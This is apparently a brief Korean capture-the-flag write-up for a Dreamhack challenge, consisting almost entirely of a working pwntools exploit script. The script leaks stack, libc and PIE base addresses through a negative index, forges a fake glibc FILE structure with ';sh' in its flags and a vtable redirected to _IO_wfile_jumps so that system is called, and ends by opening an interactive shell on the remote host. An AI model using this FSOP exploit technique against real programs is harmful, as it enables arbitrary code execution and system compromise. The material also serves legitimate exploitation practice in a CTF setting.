그냥 힙처럼 FSOP했는데, 겁나 어렵게 푸는 거였다. 나도 늙었나

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

p = remote('host3.dreamhack.games', 14512)
#p = process('./prob')
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

p.sendlineafter(b'>', b'2')
p.sendlineafter(b'index: ', b'-64')
msg = p.recvn(0x1038)
stack = u64(msg[0xde8:][:8]) - 0x290
l.address = u64(msg[0xdf0:][:8]) - 0x2a1ca
pie_base = u64(msg[0xe10:][:8]) - 0x16e3
print(hex(stack))
print(hex(l.address))
print(hex(pie_base))

assert (stack - (pie_base + 0x4020)) % 0x30 == 0

fake_fsop_struct = stack
stdout_lock = fake_fsop_struct + 0x270
FSOP = FSOP_struct(
	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
	lock=stdout_lock,
	_wide_data=fake_fsop_struct - 0x10,
	_markers=l.symbols["system"],
	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
	_mode=0xFFFFFFFF,
).ljust(0x30 * 5, b"\x00")

for i in range(0, len(FSOP), 0x30):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(0x28).encode())
    p.sendafter(b'data: ', FSOP[i+8:i+0x30])

for i in range(0, len(FSOP), 0x30):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(i // 0x30).encode())
    p.sendlineafter(b'size: ', str(u64(FSOP[i:i+8])).encode())

idx = (stack - (pie_base + 0x4020)) // 0x30
p.sendlineafter(b'> ', b'3')
#gdb.attach(p)
p.sendlineafter(b'index: ', str(-idx).encode())
p.sendlineafter(b'size: ', str(stack).encode())

p.interactive()
```